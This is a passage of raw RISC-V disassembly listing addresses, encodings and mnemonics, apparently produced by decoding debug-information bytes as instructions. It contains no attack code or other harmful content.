     b2c:	0319                	addi	t1,t1,6
     b2e:	0900                	addi	s0,sp,144
     b30:	000e                	c.slli	zero,0x3
     b32:	0501                	addi	a0,a0,0
     b34:	0308                	addi	a0,sp,384
     b36:	0901                	addi	s2,s2,0
     b38:	0006                	c.slli	zero,0x1
     b3a:	0501                	addi	a0,a0,0
     b3c:	0402001b          	addiw	zero,tp,64
     b40:	0301                	addi	t1,t1,0
     b42:	0900                	addi	s0,sp,144
     b44:	0010                	0x10
     b46:	0501                	addi	a0,a0,0
     b48:	0308                	addi	a0,sp,384
     b4a:	0901                	addi	s2,s2,0
     b4c:	000a                	c.slli	zero,0x2
     b4e:	0501                	addi	a0,a0,0
     b50:	0402001b          	addiw	zero,tp,64
     b54:	0301                	addi	t1,t1,0
     b56:	0900                	addi	s0,sp,144
     b58:	0010                	0x10
     b5a:	0001                	nop
     b5c:	0402                	slli	s0,s0,0x0
     b5e:	0302                	slli	t1,t1,0x0
     b60:	000a097b          	0xa097b
     b64:	0501                	addi	a0,a0,0
     b66:	0014                	0x14
     b68:	0402                	slli	s0,s0,0x0
     b6a:	0301                	addi	t1,t1,0
     b6c:	0900                	addi	s0,sp,144
     b6e:	000a                	c.slli	zero,0x2
     b70:	0501                	addi	a0,a0,0
     b72:	0016                	c.slli	zero,0x5
     b74:	0402                	slli	s0,s0,0x0
     b76:	0301                	addi	t1,t1,0
     b78:	0900                	addi	s0,sp,144
     b7a:	0010                	0x10
     b7c:	0501                	addi	a0,a0,0
     b7e:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     b82:	0301                	addi	t1,t1,0
     b84:	0900                	addi	s0,sp,144
     b86:	0008                	0x8
     b88:	0501                	addi	a0,a0,0
     b8a:	030d                	addi	t1,t1,3
     b8c:	000a0907          	0xa0907
     b90:	0501                	addi	a0,a0,0
     b92:	0306                	slli	t1,t1,0x1
     b94:	0900                	addi	s0,sp,144
     b96:	0008                	0x8
     b98:	0501                	addi	a0,a0,0
     b9a:	0019                	c.nop	6
     b9c:	0402                	slli	s0,s0,0x0
     b9e:	0301                	addi	t1,t1,0
     ba0:	0900                	addi	s0,sp,144
     ba2:	0002                	c.slli	zero,0x0
     ba4:	0501                	addi	a0,a0,0
     ba6:	0028                	addi	a0,sp,8
     ba8:	0402                	slli	s0,s0,0x0
     baa:	0301                	addi	t1,t1,0
     bac:	0900                	addi	s0,sp,144
     bae:	0014                	0x14
     bb0:	0501                	addi	a0,a0,0
     bb2:	001f 0402 0301      	0x3010402001f
     bb8:	0900                	addi	s0,sp,144
     bba:	000e                	c.slli	zero,0x3
     bbc:	0501                	addi	a0,a0,0
     bbe:	0012                	c.slli	zero,0x4
     bc0:	0402                	slli	s0,s0,0x0
     bc2:	0301                	addi	t1,t1,0
     bc4:	0900                	addi	s0,sp,144
     bc6:	0002                	c.slli	zero,0x0
     bc8:	0501                	addi	a0,a0,0
     bca:	030c                	addi	a1,sp,384
     bcc:	0901                	addi	s2,s2,0
     bce:	0006                	c.slli	zero,0x1
     bd0:	0501                	addi	a0,a0,0
     bd2:	030a                	slli	t1,t1,0x2
     bd4:	0901                	addi	s2,s2,0
     bd6:	0006                	c.slli	zero,0x1
     bd8:	0501                	addi	a0,a0,0
     bda:	0301                	addi	t1,t1,0
     bdc:	0901                	addi	s2,s2,0
     bde:	0002                	c.slli	zero,0x0
     be0:	0301                	addi	t1,t1,0
     be2:	00080903          	lb	s2,0(a6)
     be6:	0501                	addi	a0,a0,0
     be8:	030a                	slli	t1,t1,0x2
     bea:	00140903          	lb	s2,1(s0)
     bee:	0501                	addi	a0,a0,0
     bf0:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     bf4:	0004                	0x4
     bf6:	0501                	addi	a0,a0,0
     bf8:	0315                	addi	t1,t1,5
     bfa:	0902                	slli	s2,s2,0x0
     bfc:	0002                	c.slli	zero,0x0
     bfe:	0501                	addi	a0,a0,0
     c00:	030c                	addi	a1,sp,384
     c02:	0900                	addi	s0,sp,144
     c04:	000c                	0xc
     c06:	0501                	addi	a0,a0,0
     c08:	09000323          	sb	a6,134(zero) # 86 <_tbss_end+0x2>
     c0c:	0006                	c.slli	zero,0x1
     c0e:	0501                	addi	a0,a0,0
     c10:	031a                	slli	t1,t1,0x6
     c12:	0900                	addi	s0,sp,144
     c14:	000e                	c.slli	zero,0x3
     c16:	0501                	addi	a0,a0,0
     c18:	09010317          	auipc	t1,0x9010
     c1c:	0006                	c.slli	zero,0x1
     c1e:	0501                	addi	a0,a0,0
     c20:	030c                	addi	a1,sp,384
     c22:	0900                	addi	s0,sp,144
     c24:	000c                	0xc
     c26:	0501                	addi	a0,a0,0
     c28:	09000327          	0x9000327
     c2c:	0006                	c.slli	zero,0x1
     c2e:	0501                	addi	a0,a0,0
     c30:	031c                	addi	a5,sp,384
     c32:	0900                	addi	s0,sp,144
     c34:	000e                	c.slli	zero,0x3
     c36:	0501                	addi	a0,a0,0
     c38:	0312                	slli	t1,t1,0x4
     c3a:	0901                	addi	s2,s2,0
     c3c:	0006                	c.slli	zero,0x1
     c3e:	0501                	addi	a0,a0,0
     c40:	0309                	addi	t1,t1,2
     c42:	0900                	addi	s0,sp,144
     c44:	0014                	0x14
     c46:	0501                	addi	a0,a0,0
     c48:	0322                	slli	t1,t1,0x8
     c4a:	0900                	addi	s0,sp,144
     c4c:	0004                	0x4
     c4e:	0501                	addi	a0,a0,0
     c50:	0319                	addi	t1,t1,6
     c52:	0900                	addi	s0,sp,144
     c54:	0014                	0x14
     c56:	0501                	addi	a0,a0,0
     c58:	0901030f          	0x901030f
     c5c:	0004                	0x4
     c5e:	0501                	addi	a0,a0,0
     c60:	0308                	addi	a0,sp,384
     c62:	0900                	addi	s0,sp,144
     c64:	000c                	0xc
     c66:	0501                	addi	a0,a0,0
     c68:	001f 0402 0301      	0x3010402001f
     c6e:	0900                	addi	s0,sp,144
     c70:	0002                	c.slli	zero,0x0
     c72:	0501                	addi	a0,a0,0
     c74:	0021                	c.nop	8
     c76:	0402                	slli	s0,s0,0x0
     c78:	0301                	addi	t1,t1,0
     c7a:	0900                	addi	s0,sp,144
     c7c:	0008                	0x8
     c7e:	0501                	addi	a0,a0,0
     c80:	0402001b          	addiw	zero,tp,64
     c84:	0302                	slli	t1,t1,0x0
     c86:	000a097b          	0xa097b
     c8a:	0501                	addi	a0,a0,0
     c8c:	0014                	0x14
     c8e:	0402                	slli	s0,s0,0x0
     c90:	0301                	addi	t1,t1,0
     c92:	0900                	addi	s0,sp,144
     c94:	000a                	c.slli	zero,0x2
     c96:	0501                	addi	a0,a0,0
     c98:	0016                	c.slli	zero,0x5
     c9a:	0402                	slli	s0,s0,0x0
     c9c:	0301                	addi	t1,t1,0
     c9e:	0900                	addi	s0,sp,144
     ca0:	0010                	0x10
     ca2:	0501                	addi	a0,a0,0
     ca4:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     ca8:	0301                	addi	t1,t1,0
     caa:	0900                	addi	s0,sp,144
     cac:	0008                	0x8
     cae:	0501                	addi	a0,a0,0
     cb0:	030d                	addi	t1,t1,3
     cb2:	000a0907          	0xa0907
     cb6:	0501                	addi	a0,a0,0
     cb8:	0306                	slli	t1,t1,0x1
     cba:	0900                	addi	s0,sp,144
     cbc:	0008                	0x8
     cbe:	0501                	addi	a0,a0,0
     cc0:	0019                	c.nop	6
     cc2:	0402                	slli	s0,s0,0x0
     cc4:	0301                	addi	t1,t1,0
     cc6:	0900                	addi	s0,sp,144
     cc8:	0002                	c.slli	zero,0x0
     cca:	0501                	addi	a0,a0,0
     ccc:	0028                	addi	a0,sp,8
     cce:	0402                	slli	s0,s0,0x0
     cd0:	0301                	addi	t1,t1,0
     cd2:	0900                	addi	s0,sp,144
     cd4:	0010                	0x10
     cd6:	0501                	addi	a0,a0,0
     cd8:	0012                	c.slli	zero,0x4
     cda:	0402                	slli	s0,s0,0x0
     cdc:	0301                	addi	t1,t1,0
     cde:	0900                	addi	s0,sp,144
     ce0:	0010                	0x10
     ce2:	0501                	addi	a0,a0,0
     ce4:	030c                	addi	a1,sp,384
     ce6:	0901                	addi	s2,s2,0
     ce8:	0006                	c.slli	zero,0x1
     cea:	0501                	addi	a0,a0,0
     cec:	030a                	slli	t1,t1,0x2
     cee:	0901                	addi	s2,s2,0
     cf0:	0006                	c.slli	zero,0x1
     cf2:	0501                	addi	a0,a0,0
     cf4:	0301                	addi	t1,t1,0
     cf6:	0901                	addi	s2,s2,0
     cf8:	0002                	c.slli	zero,0x0
     cfa:	0301                	addi	t1,t1,0
     cfc:	00080903          	lb	s2,0(a6)
     d00:	0501                	addi	a0,a0,0
     d02:	09050303          	lb	t1,144(a0) # 19090 <_tbss_end+0x1900c>
     d06:	000c                	0xc
     d08:	0501                	addi	a0,a0,0
     d0a:	0311                	addi	t1,t1,4
     d0c:	0902                	slli	s2,s2,0x0
     d0e:	0004                	0x4
     d10:	0501                	addi	a0,a0,0
     d12:	0900030f          	0x900030f
     d16:	0010                	0x10
     d18:	0501                	addi	a0,a0,0
     d1a:	09010307          	0x9010307
     d1e:	0004                	0x4
     d20:	0501                	addi	a0,a0,0
     d22:	0330                	addi	a2,sp,392
     d24:	0900                	addi	s0,sp,144
     d26:	001a                	c.slli	zero,0x6
     d28:	0501                	addi	a0,a0,0
     d2a:	0306                	slli	t1,t1,0x1
     d2c:	0900                	addi	s0,sp,144
     d2e:	0008                	0x8
     d30:	0501                	addi	a0,a0,0
     d32:	0902030b          	0x902030b
     d36:	0004                	0x4
     d38:	0301                	addi	t1,t1,0
     d3a:	0901                	addi	s2,s2,0
     d3c:	000c                	0xc
     d3e:	0501                	addi	a0,a0,0
     d40:	030d                	addi	t1,t1,3
     d42:	0902                	slli	s2,s2,0x0
     d44:	0010                	0x10
     d46:	0501                	addi	a0,a0,0
     d48:	0014                	0x14
     d4a:	0402                	slli	s0,s0,0x0
     d4c:	0301                	addi	t1,t1,0
     d4e:	0900                	addi	s0,sp,144
     d50:	0002                	c.slli	zero,0x0
     d52:	0501                	addi	a0,a0,0
     d54:	000d                	c.nop	3
     d56:	0402                	slli	s0,s0,0x0
     d58:	0301                	addi	t1,t1,0
     d5a:	0900                	addi	s0,sp,144
     d5c:	0012                	c.slli	zero,0x4
     d5e:	0501                	addi	a0,a0,0
     d60:	09030303          	lb	t1,144(t1) # 9010ca8 <_tbss_end+0x9010c24>
     d64:	0004                	0x4
     d66:	0501                	addi	a0,a0,0
     d68:	0301                	addi	t1,t1,0
     d6a:	0901                	addi	s2,s2,0
     d6c:	0004                	0x4
     d6e:	0301                	addi	t1,t1,0
     d70:	00080903          	lb	s2,0(a6)
     d74:	0501                	addi	a0,a0,0
     d76:	031a                	slli	t1,t1,0x6
     d78:	0901                	addi	s2,s2,0
     d7a:	000a                	c.slli	zero,0x2
     d7c:	0501                	addi	a0,a0,0
     d7e:	0315                	addi	t1,t1,5
     d80:	0900                	addi	s0,sp,144
     d82:	0008                	0x8
     d84:	0501                	addi	a0,a0,0
     d86:	030c                	addi	a1,sp,384
     d88:	0900                	addi	s0,sp,144
     d8a:	0006                	c.slli	zero,0x1
     d8c:	0501                	addi	a0,a0,0
     d8e:	030d                	addi	t1,t1,3
     d90:	0901                	addi	s2,s2,0
     d92:	0006                	c.slli	zero,0x1
     d94:	0501                	addi	a0,a0,0
     d96:	031a                	slli	t1,t1,0x6
     d98:	0900                	addi	s0,sp,144
     d9a:	0008                	0x8
     d9c:	0501                	addi	a0,a0,0
     d9e:	09000313          	li	t1,144
     da2:	0006                	c.slli	zero,0x1
     da4:	0501                	addi	a0,a0,0
     da6:	0301                	addi	t1,t1,0
     da8:	0901                	addi	s2,s2,0
     daa:	0002                	c.slli	zero,0x0
     dac:	0401                	addi	s0,s0,0
     dae:	0302                	slli	t1,t1,0x0
     db0:	7f9d                	lui	t6,0xfffe7
     db2:	0809                	addi	a6,a6,2
     db4:	0100                	addi	s0,sp,128
     db6:	1005                	c.nop	-31
     db8:	2e090203          	lb	tp,736(s2)
     dbc:	0100                	addi	s0,sp,128
     dbe:	06090103          	lb	sp,96(s2)
     dc2:	0100                	addi	s0,sp,128
     dc4:	06090103          	lb	sp,96(s2)
     dc8:	0100                	addi	s0,sp,128
     dca:	06090103          	lb	sp,96(s2)
     dce:	0100                	addi	s0,sp,128
     dd0:	0305                	addi	t1,t1,1
     dd2:	06090103          	lb	sp,96(s2)
     dd6:	0100                	addi	s0,sp,128
     dd8:	0c05                	addi	s8,s8,1
     dda:	04090203          	lb	tp,64(s2)
     dde:	0100                	addi	s0,sp,128
     de0:	0a05                	addi	s4,s4,1
     de2:	02090003          	lb	zero,32(s2)
     de6:	0100                	addi	s0,sp,128
     de8:	0905                	addi	s2,s2,1
     dea:	0a090103          	lb	sp,160(s2)
     dee:	0100                	addi	s0,sp,128
     df0:	1305                	addi	t1,t1,-31
     df2:	0200                	addi	s0,sp,256
     df4:	0104                	addi	s1,sp,128
     df6:	02090003          	lb	zero,32(s2)
     dfa:	0100                	addi	s0,sp,128
     dfc:	0905                	addi	s2,s2,1
     dfe:	0200                	addi	s0,sp,256
     e00:	0104                	addi	s1,sp,128
     e02:	0a090003          	lb	zero,160(s2)
     e06:	0100                	addi	s0,sp,128
     e08:	0c05                	addi	s8,s8,1
     e0a:	02090203          	lb	tp,32(s2)
     e0e:	0100                	addi	s0,sp,128
     e10:	0305                	addi	t1,t1,1
     e12:	0c090203          	lb	tp,192(s2)
     e16:	0100                	addi	s0,sp,128
     e18:	1305                	addi	t1,t1,-31
     e1a:	04090103          	lb	sp,64(s2)
     e1e:	0100                	addi	s0,sp,128
     e20:	0105                	addi	sp,sp,1
     e22:	02090103          	lb	sp,32(s2)
     e26:	0100                	addi	s0,sp,128
     e28:	08090703          	lb	a4,128(s2)
     e2c:	0100                	addi	s0,sp,128
     e2e:	0705                	addi	a4,a4,1
     e30:	0c090103          	lb	sp,192(s2)
     e34:	0100                	addi	s0,sp,128
     e36:	0305                	addi	t1,t1,1
     e38:	0200                	addi	s0,sp,256
     e3a:	0104                	addi	s1,sp,128
     e3c:	04090803          	lb	a6,64(s2)
     e40:	0100                	addi	s0,sp,128
     e42:	0200                	addi	s0,sp,256
     e44:	0204                	addi	s1,sp,256
     e46:	0306                	slli	t1,t1,0x1
     e48:	0900                	addi	s0,sp,144
     e4a:	000e                	c.slli	zero,0x3
     e4c:	0001                	nop
     e4e:	0402                	slli	s0,s0,0x0
     e50:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     e54:	0018                	0x18
     e56:	0001                	nop
     e58:	0402                	slli	s0,s0,0x0
     e5a:	0305                	addi	t1,t1,1
     e5c:	0900                	addi	s0,sp,144
     e5e:	0038                	addi	a4,sp,8
     e60:	0001                	nop
     e62:	0402                	slli	s0,s0,0x0
     e64:	0601                	addi	a2,a2,0
     e66:	1e090103          	lb	sp,480(s2)
     e6a:	0100                	addi	s0,sp,128
     e6c:	0200                	addi	s0,sp,256
     e6e:	0204                	addi	s1,sp,256
     e70:	0306                	slli	t1,t1,0x1
     e72:	0900                	addi	s0,sp,144
     e74:	000e                	c.slli	zero,0x3
     e76:	0001                	nop
     e78:	0402                	slli	s0,s0,0x0
     e7a:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     e7e:	0018                	0x18
     e80:	0001                	nop
     e82:	0402                	slli	s0,s0,0x0
     e84:	0305                	addi	t1,t1,1
     e86:	0900                	addi	s0,sp,144
     e88:	0038                	addi	a4,sp,8
     e8a:	0501                	addi	a0,a0,0
     e8c:	0001                	nop
     e8e:	0402                	slli	s0,s0,0x0
     e90:	0605                	addi	a2,a2,1
     e92:	1e090303          	lb	t1,480(s2)
     e96:	0100                	addi	s0,sp,128
     e98:	08090303          	lb	t1,128(s2)
     e9c:	0100                	addi	s0,sp,128
     e9e:	1205                	addi	tp,tp,-31
     ea0:	0a090103          	lb	sp,160(s2)
     ea4:	0100                	addi	s0,sp,128
     ea6:	1805                	addi	a6,a6,-31
     ea8:	06090003          	lb	zero,96(s2)
     eac:	0100                	addi	s0,sp,128
     eae:	0a05                	addi	s4,s4,1
     eb0:	04090003          	lb	zero,64(s2)
     eb4:	0100                	addi	s0,sp,128
     eb6:	0905                	addi	s2,s2,1
     eb8:	0200                	addi	s0,sp,256
     eba:	0104                	addi	s1,sp,128
     ebc:	0a090103          	lb	sp,160(s2)
     ec0:	0100                	addi	s0,sp,128
     ec2:	0105                	addi	sp,sp,1
     ec4:	02090403          	lb	s0,32(s2)
     ec8:	0100                	addi	s0,sp,128
     eca:	0305                	addi	t1,t1,1
     ecc:	14090103          	lb	sp,320(s2)
     ed0:	0100                	addi	s0,sp,128
     ed2:	0105                	addi	sp,sp,1
     ed4:	08090403          	lb	s0,128(s2)
     ed8:	0100                	addi	s0,sp,128
     eda:	0305                	addi	t1,t1,1
     edc:	0e090103          	lb	sp,224(s2)
     ee0:	0100                	addi	s0,sp,128
     ee2:	0105                	addi	sp,sp,1
     ee4:	0a090403          	lb	s0,160(s2)
     ee8:	0100                	addi	s0,sp,128
     eea:	0305                	addi	t1,t1,1
     eec:	08090103          	lb	sp,128(s2)
     ef0:	0100                	addi	s0,sp,128
     ef2:	0105                	addi	sp,sp,1
     ef4:	08090403          	lb	s0,128(s2)
     ef8:	0100                	addi	s0,sp,128
     efa:	0305                	addi	t1,t1,1
     efc:	0e090103          	lb	sp,224(s2)
     f00:	0100                	addi	s0,sp,128
     f02:	0105                	addi	sp,sp,1
     f04:	1c090103          	lb	sp,448(s2)
     f08:	0100                	addi	s0,sp,128
     f0a:	0c090303          	lb	t1,192(s2)
     f0e:	0100                	addi	s0,sp,128
     f10:	0905                	addi	s2,s2,1
     f12:	0200                	addi	s0,sp,256
     f14:	0104                	addi	s1,sp,128
     f16:	14090303          	lb	t1,320(s2)
     f1a:	0100                	addi	s0,sp,128
     f1c:	0105                	addi	sp,sp,1
     f1e:	08090103          	lb	sp,128(s2)
     f22:	0100                	addi	s0,sp,128
     f24:	0a090303          	lb	t1,160(s2)
     f28:	0100                	addi	s0,sp,128
     f2a:	0305                	addi	t1,t1,1
     f2c:	12090203          	lb	tp,288(s2)
     f30:	0100                	addi	s0,sp,128
     f32:	0a05                	addi	s4,s4,1
     f34:	0c090103          	lb	sp,192(s2)
     f38:	0100                	addi	s0,sp,128
     f3a:	0105                	addi	sp,sp,1
     f3c:	02090103          	lb	sp,32(s2)
     f40:	0100                	addi	s0,sp,128
     f42:	0a090303          	lb	t1,160(s2)
     f46:	0100                	addi	s0,sp,128
     f48:	2305                	addiw	t1,t1,1
     f4a:	08090403          	lb	s0,128(s2)
     f4e:	0100                	addi	s0,sp,128
     f50:	0a05                	addi	s4,s4,1
     f52:	0c090003          	lb	zero,192(s2)
     f56:	0100                	addi	s0,sp,128
     f58:	0305                	addi	t1,t1,1
     f5a:	04090103          	lb	sp,64(s2)
     f5e:	0100                	addi	s0,sp,128
     f60:	2105                	addiw	sp,sp,1
     f62:	14090103          	lb	sp,320(s2)
     f66:	0100                	addi	s0,sp,128
     f68:	0a05                	addi	s4,s4,1
     f6a:	0c090003          	lb	zero,192(s2)
     f6e:	0100                	addi	s0,sp,128
     f70:	0305                	addi	t1,t1,1
     f72:	04090103          	lb	sp,64(s2)
     f76:	0100                	addi	s0,sp,128
     f78:	0105                	addi	sp,sp,1
     f7a:	14090103          	lb	sp,320(s2)
     f7e:	0100                	addi	s0,sp,128
     f80:	0a090303          	lb	t1,160(s2)
     f84:	0100                	addi	s0,sp,128
     f86:	0305                	addi	t1,t1,1
     f88:	32090103          	lb	sp,800(s2)
     f8c:	0100                	addi	s0,sp,128
     f8e:	04090103          	lb	sp,64(s2)
     f92:	0100                	addi	s0,sp,128
     f94:	0d05                	addi	s10,s10,1
     f96:	10090303          	lb	t1,256(s2)
     f9a:	0100                	addi	s0,sp,128
     f9c:	0905                	addi	s2,s2,1
     f9e:	0e090303          	lb	t1,224(s2)
     fa2:	0100                	addi	s0,sp,128
     fa4:	0c05                	addi	s8,s8,1
     fa6:	04090103          	lb	sp,64(s2)
     faa:	0100                	addi	s0,sp,128
     fac:	0305                	addi	t1,t1,1
     fae:	04090003          	lb	zero,64(s2)
     fb2:	0100                	addi	s0,sp,128
     fb4:	1105                	addi	sp,sp,-31
     fb6:	02090103          	lb	sp,32(s2)
     fba:	0100                	addi	s0,sp,128
     fbc:	0805                	addi	a6,a6,1
     fbe:	12090003          	lb	zero,288(s2)
     fc2:	0100                	addi	s0,sp,128
     fc4:	0f05                	addi	t5,t5,1
     fc6:	02090103          	lb	sp,32(s2)
     fca:	0100                	addi	s0,sp,128
     fcc:	0c05                	addi	s8,s8,1
     fce:	3a090003          	lb	zero,928(s2)
     fd2:	0100                	addi	s0,sp,128
     fd4:	2605                	addiw	a2,a2,1
     fd6:	0200                	addi	s0,sp,256
     fd8:	0204                	addi	s1,sp,256
     fda:	0a097e03          	0xa097e03
     fde:	0100                	addi	s0,sp,128
     fe0:	0305                	addi	t1,t1,1
     fe2:	0200                	addi	s0,sp,256
     fe4:	0104                	addi	s1,sp,128
     fe6:	0a090003          	lb	zero,160(s2)
     fea:	0100                	addi	s0,sp,128
     fec:	0605                	addi	a2,a2,1
     fee:	0e090303          	lb	t1,224(s2)
     ff2:	0100                	addi	s0,sp,128
     ff4:	0505                	addi	a0,a0,1
     ff6:	08090103          	lb	sp,128(s2)
     ffa:	0100                	addi	s0,sp,128
     ffc:	0305                	addi	t1,t1,1
     ffe:	06090203          	lb	tp,96(s2)
    1002:	0100                	addi	s0,sp,128
    1004:	0105                	addi	sp,sp,1
    1006:	0a090503          	lb	a0,160(s2)
    100a:	0100                	addi	s0,sp,128
    100c:	0d05                	addi	s10,s10,1
    100e:	0e090403          	lb	s0,224(s2)
    1012:	0100                	addi	s0,sp,128
    1014:	1105                	addi	sp,sp,-31
    1016:	10090003          	lb	zero,256(s2)
    101a:	0100                	addi	s0,sp,128
    101c:	0605                	addi	a2,a2,1
    101e:	12090203          	lb	tp,288(s2)
    1022:	0100                	addi	s0,sp,128
    1024:	1c05                	addi	s8,s8,-31
    1026:	0200                	addi	s0,sp,256
    1028:	0104                	addi	s1,sp,128
    102a:	0e090003          	lb	zero,224(s2)
    102e:	0100                	addi	s0,sp,128
    1030:	1205                	addi	tp,tp,-31
    1032:	0200                	addi	s0,sp,256
    1034:	0104                	addi	s1,sp,128
    1036:	04090003          	lb	zero,64(s2)
    103a:	0100                	addi	s0,sp,128
    103c:	0505                	addi	a0,a0,1
    103e:	0a090203          	lb	tp,160(s2)
    1042:	0100                	addi	s0,sp,128
    1044:	0c05                	addi	s8,s8,1
    1046:	16090103          	lb	sp,352(s2)
    104a:	0100                	addi	s0,sp,128
    104c:	0a05                	addi	s4,s4,1
    104e:	04090303          	lb	t1,64(s2)
    1052:	0100                	addi	s0,sp,128
    1054:	0105                	addi	sp,sp,1
    1056:	02090103          	lb	sp,32(s2)
    105a:	0100                	addi	s0,sp,128
    105c:	0a090303          	lb	t1,160(s2)
    1060:	0100                	addi	s0,sp,128
    1062:	0a05                	addi	s4,s4,1
    1064:	0c090303          	lb	t1,192(s2)
    1068:	0100                	addi	s0,sp,128
    106a:	0305                	addi	t1,t1,1
    106c:	04090003          	lb	zero,64(s2)
    1070:	0100                	addi	s0,sp,128
    1072:	1405                	addi	s0,s0,-31
    1074:	02090203          	lb	tp,32(s2)
    1078:	0100                	addi	s0,sp,128
    107a:	2105                	addiw	sp,sp,1
    107c:	0e090003          	lb	zero,224(s2)
    1080:	0100                	addi	s0,sp,128
    1082:	1b05                	addi	s6,s6,-31
    1084:	08090003          	lb	zero,128(s2)
    1088:	0100                	addi	s0,sp,128
    108a:	0200                	addi	s0,sp,256
    108c:	0104                	addi	s1,sp,128
    108e:	0306                	slli	t1,t1,0x1
    1090:	0900                	addi	s0,sp,144
    1092:	0006                	c.slli	zero,0x1
    1094:	0001                	nop
    1096:	0402                	slli	s0,s0,0x0
    1098:	0302                	slli	t1,t1,0x0
    109a:	0900                	addi	s0,sp,144
    109c:	0006                	c.slli	zero,0x1
    109e:	0501                	addi	a0,a0,0
    10a0:	0402000b          	0x402000b
    10a4:	0604                	addi	s1,sp,768
    10a6:	04090003          	lb	zero,64(s2)
    10aa:	0100                	addi	s0,sp,128
    10ac:	1b05                	addi	s6,s6,-31
    10ae:	0200                	addi	s0,sp,256
    10b0:	0404                	addi	s1,sp,512
    10b2:	0c090003          	lb	zero,192(s2)
    10b6:	0100                	addi	s0,sp,128
    10b8:	0f05                	addi	t5,t5,1
    10ba:	0200                	addi	s0,sp,256
    10bc:	0404                	addi	s1,sp,512
    10be:	06090003          	lb	zero,96(s2)
    10c2:	0100                	addi	s0,sp,128
    10c4:	0705                	addi	a4,a4,1
    10c6:	0200                	addi	s0,sp,256
    10c8:	0404                	addi	s1,sp,512
    10ca:	0a090103          	lb	sp,160(s2)
    10ce:	0100                	addi	s0,sp,128
    10d0:	1805                	addi	a6,a6,-31
    10d2:	0200                	addi	s0,sp,256
    10d4:	0404                	addi	s1,sp,512
    10d6:	0a097d03          	0xa097d03
    10da:	0100                	addi	s0,sp,128
    10dc:	0305                	addi	t1,t1,1
    10de:	0200                	addi	s0,sp,256
    10e0:	0204                	addi	s1,sp,256
    10e2:	0a090003          	lb	zero,160(s2)
    10e6:	0100                	addi	s0,sp,128
    10e8:	0b05                	addi	s6,s6,1
    10ea:	0e090503          	lb	a0,224(s2)
    10ee:	0100                	addi	s0,sp,128
    10f0:	0305                	addi	t1,t1,1
    10f2:	04090203          	lb	tp,64(s2)
    10f6:	0100                	addi	s0,sp,128
    10f8:	0105                	addi	sp,sp,1
    10fa:	0a090103          	lb	sp,160(s2)
    10fe:	0100                	addi	s0,sp,128
    1100:	0a090403          	lb	s0,160(s2)
    1104:	0100                	addi	s0,sp,128
    1106:	0705                	addi	a4,a4,1
    1108:	2c090203          	lb	tp,704(s2)
    110c:	0100                	addi	s0,sp,128
    110e:	1705                	addi	a4,a4,-31
    1110:	04090403          	lb	s0,64(s2)
    1114:	0100                	addi	s0,sp,128
    1116:	0d05                	addi	s10,s10,1
    1118:	0c090003          	lb	zero,192(s2)
    111c:	0100                	addi	s0,sp,128
    111e:	1105                	addi	sp,sp,-31
    1120:	0c090003          	lb	zero,192(s2)
    1124:	0100                	addi	s0,sp,128
    1126:	0d05                	addi	s10,s10,1
    1128:	10090103          	lb	sp,256(s2)
    112c:	0100                	addi	s0,sp,128
    112e:	0805                	addi	a6,a6,1
    1130:	04090003          	lb	zero,64(s2)
    1134:	0100                	addi	s0,sp,128
    1136:	0905                	addi	s2,s2,1
    1138:	08090203          	lb	tp,128(s2)
    113c:	0100                	addi	s0,sp,128
    113e:	1105                	addi	sp,sp,-31
    1140:	10097d03          	0x10097d03
    1144:	0100                	addi	s0,sp,128
    1146:	0705                	addi	a4,a4,1
    1148:	02090203          	lb	tp,32(s2)
    114c:	0100                	addi	s0,sp,128
    114e:	0905                	addi	s2,s2,1
    1150:	02090403          	lb	s0,32(s2)
    1154:	0100                	addi	s0,sp,128
    1156:	0505                	addi	a0,a0,1
    1158:	02090103          	lb	sp,32(s2)
    115c:	0100                	addi	s0,sp,128
    115e:	0f05                	addi	t5,t5,1
    1160:	10097f03          	0x10097f03
    1164:	0100                	addi	s0,sp,128
    1166:	0905                	addi	s2,s2,1
    1168:	0c090003          	lb	zero,192(s2)
    116c:	0100                	addi	s0,sp,128
    116e:	0a090303          	lb	t1,160(s2)
    1172:	0100                	addi	s0,sp,128
    1174:	0f05                	addi	t5,t5,1
    1176:	02090103          	lb	sp,32(s2)
    117a:	0100                	addi	s0,sp,128
    117c:	1c05                	addi	s8,s8,-31
    117e:	10090003          	lb	zero,256(s2)
    1182:	0100                	addi	s0,sp,128
    1184:	3305                	addiw	t1,t1,-31
    1186:	10090003          	lb	zero,256(s2)
    118a:	0100                	addi	s0,sp,128
    118c:	0200                	addi	s0,sp,256
    118e:	0104                	addi	s1,sp,128
    1190:	0306                	slli	t1,t1,0x1
    1192:	0900                	addi	s0,sp,144
    1194:	0008                	0x8
    1196:	0001                	nop
    1198:	0402                	slli	s0,s0,0x0
    119a:	0302                	slli	t1,t1,0x0
    119c:	0900                	addi	s0,sp,144
    119e:	0006                	c.slli	zero,0x1
    11a0:	0501                	addi	a0,a0,0
    11a2:	0015                	c.nop	5
    11a4:	0402                	slli	s0,s0,0x0
    11a6:	0604                	addi	s1,sp,768
    11a8:	04090003          	lb	zero,64(s2)
    11ac:	0100                	addi	s0,sp,128
    11ae:	0505                	addi	a0,a0,1
    11b0:	0200                	addi	s0,sp,256
    11b2:	0404                	addi	s1,sp,512
    11b4:	04090003          	lb	zero,64(s2)
    11b8:	0100                	addi	s0,sp,128
    11ba:	0d05                	addi	s10,s10,1
    11bc:	0e097f03          	0xe097f03
    11c0:	0100                	addi	s0,sp,128
    11c2:	0905                	addi	s2,s2,1
    11c4:	0c090003          	lb	zero,192(s2)
    11c8:	0100                	addi	s0,sp,128
    11ca:	0105                	addi	sp,sp,1
    11cc:	04090203          	lb	tp,64(s2)
    11d0:	0100                	addi	s0,sp,128
    11d2:	0c090303          	lb	t1,192(s2)
    11d6:	0100                	addi	s0,sp,128
    11d8:	0605                	addi	a2,a2,1
    11da:	10090103          	lb	sp,256(s2)
    11de:	0100                	addi	s0,sp,128
    11e0:	0c05                	addi	s8,s8,1
    11e2:	0e090103          	lb	sp,224(s2)
    11e6:	0100                	addi	s0,sp,128
    11e8:	0b05                	addi	s6,s6,1
    11ea:	14090103          	lb	sp,320(s2)
    11ee:	0100                	addi	s0,sp,128
    11f0:	0c05                	addi	s8,s8,1
    11f2:	08090103          	lb	sp,128(s2)
    11f6:	0100                	addi	s0,sp,128
    11f8:	14090203          	lb	tp,320(s2)
